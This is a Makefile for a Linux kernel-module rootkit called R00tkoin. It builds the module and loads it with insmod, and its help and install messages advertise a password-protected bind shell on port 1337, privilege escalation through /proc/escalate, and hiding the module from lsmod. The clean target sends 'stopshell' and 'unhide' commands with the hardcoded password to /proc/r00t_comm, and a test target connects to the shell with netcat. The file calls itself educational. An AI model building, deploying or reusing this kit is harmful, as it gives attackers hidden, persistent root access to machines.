obj-m := r00tkoin.o

# Directories
OUTPUT_DIR := output
SCRIPTS_DIR := scripts
LOGS_DIR := logs

# Kernel build directory
KDIR ?= /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

# Ensure output directory exists
$(shell mkdir -p $(OUTPUT_DIR))

# Default target
all:
	@echo "=========================================="
	@echo "Building R00tkoin LKM Rootkit v1.0"
	@echo "WARNING: For authorized security testing only!"
	@echo "Features: Module Hiding + File Hiding + Network Shell + Stealth Comm"
	@echo "=========================================="
	@echo "Starting kernel module build..."
	$(MAKE) -C $(KDIR) M=$(PWD) modules
	@echo "Moving build artifacts to $(OUTPUT_DIR)/"
	@mv *.ko $(OUTPUT_DIR)/ 2>/dev/null || true
	@mv *.o $(OUTPUT_DIR)/ 2>/dev/null || true  
	@mv *.mod $(OUTPUT_DIR)/ 2>/dev/null || true
	@mv *.mod.c $(OUTPUT_DIR)/ 2>/dev/null || true
	@mv *.symvers $(OUTPUT_DIR)/ 2>/dev/null || true
	@mv Module.symvers $(OUTPUT_DIR)/ 2>/dev/null || true
	@mv *.order $(OUTPUT_DIR)/ 2>/dev/null || true
	@mv modules.order $(OUTPUT_DIR)/ 2>/dev/null || true
	@mv .*.cmd $(OUTPUT_DIR)/ 2>/dev/null || true
	@if [ -d .tmp_versions ]; then rm -rf $(OUTPUT_DIR)/.tmp_versions 2>/dev/null || true; mv .tmp_versions $(OUTPUT_DIR)/ 2>/dev/null || true; fi
	@echo "✓ All build artifacts moved to $(OUTPUT_DIR)/"
	@echo "Build complete. Module available at $(OUTPUT_DIR)/r00tkoin.ko"

# Clean target
clean:
	@echo "Cleaning build files..."
	@echo "Unloading module if loaded..."
	@if [ -e /proc/r00t_comm ]; then \
		echo "Module detected via proc interface, stopping services..."; \
		echo 'r00tkoinFTW1337 stopshell' > /proc/r00t_comm 2>/dev/null || true; \
		sleep 1; \
		echo "Attempting to unhide module..."; \
		echo 'r00tkoinFTW1337 unhide' > /proc/r00t_comm 2>/dev/null || true; \
		sleep 1; \
	fi
	@sudo rmmod r00tkoin 2>/dev/null || echo "Module not loaded or already unloaded"
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	@echo "Cleaning root directory artifacts..."
	rm -f *.symvers *.order *.mod *.mod.c .*.cmd
	rm -f Module.symvers modules.order
	rm -rf .tmp_versions
	@echo "Cleaning output directory artifacts..."
	rm -f $(OUTPUT_DIR)/r00tkoin.ko $(OUTPUT_DIR)/r00tkoin.o $(OUTPUT_DIR)/r00tkoin.mod $(OUTPUT_DIR)/r00tkoin.mod.c
	rm -f $(OUTPUT_DIR)/*.symvers $(OUTPUT_DIR)/*.order $(OUTPUT_DIR)/.*.cmd
	rm -f $(OUTPUT_DIR)/Module.symvers $(OUTPUT_DIR)/modules.order
	rm -rf $(OUTPUT_DIR)/.tmp_versions
	@echo "✓ Clean complete - all artifacts removed."

# Install target (loads the module)
install: all
	@echo "=========================================="
	@echo "Loading R00tkoin v1.0..."
	@echo "WARNING: Rootkit module - use in isolated environments only!"
	@echo "=========================================="
	@echo "Loading module..."
	sudo insmod $(OUTPUT_DIR)/r00tkoin.ko
	@echo "✓ Module loaded successfully. Check dmesg for status."
	@echo "✓ Network shell active on port 1337"
	@echo "✓ Password: rootkoinFTW1337"

# Uninstall target (unloads the module)
uninstall:
	@echo "Unloading R00tkoin v1.0..."
	@sudo rmmod r00tkoin 2>/dev/null || echo "Module not loaded or hidden"
	@echo "R00tkoin unload complete."

# Test bind shell
test-shell:
	@echo "=========================================="
	@echo "Testing RootKoin Network Shell"
	@echo "=========================================="
	@echo "Checking if network shell is listening on port 1337..."
	@ss -tlnp | grep 1337 && echo "✓ Network shell is active" || echo "✗ Network shell not detected"
	@echo ""
	@echo "Manual test: nc localhost 1337"
	@echo "Password: rootkoinFTW1337"

# Show help
help:
	@echo "=========================================="
	@echo "RootKoin Educational Rootkit v2.0"
	@echo "=========================================="
	@echo "WARNING: FOR EDUCATIONAL USE ONLY!"
	@echo ""
	@echo "Available targets:"
	@echo "  all         - Build the kernel module"
	@echo "  clean       - Clean build files"
	@echo "  install     - Load the rootkit module"
	@echo "  uninstall   - Unload the rootkit module"
	@echo "  test-shell  - Test network shell functionality"
	@echo "  help        - Show this help"
	@echo ""
	@echo "Features:"
	@echo "  - Network shell on port 1337 (password: rootkoinFTW1337)"
	@echo "  - Privilege escalation via /proc/escalate (password: rootkoinFTW1337)"
	@echo "  - Module hiding from lsmod"
	@echo "  - Comprehensive activity logging"
	@echo ""
	@echo "Usage:"
	@echo "  make all && sudo make install"
	@echo "  make test-shell"
	@echo "  nc localhost 1337  # Connect to network shell"
	@echo "  sudo make uninstall"

.PHONY: all clean install uninstall test-shell help 